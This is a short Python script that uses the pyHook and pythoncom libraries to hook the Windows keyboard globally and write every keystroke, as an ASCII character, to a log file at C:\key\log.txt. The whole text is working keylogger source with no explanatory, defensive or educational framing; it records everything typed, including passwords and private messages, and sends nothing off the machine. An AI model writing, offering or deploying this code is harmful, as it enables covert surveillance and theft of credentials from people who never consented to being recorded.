import pyHook
import pythoncom
import sys

import logging
log='C:\key\log.txt'

def events(event):
    logging.basicConfig(filename=log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager=pyHook.HookManager()
hooks_manager.KeyDown=events
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
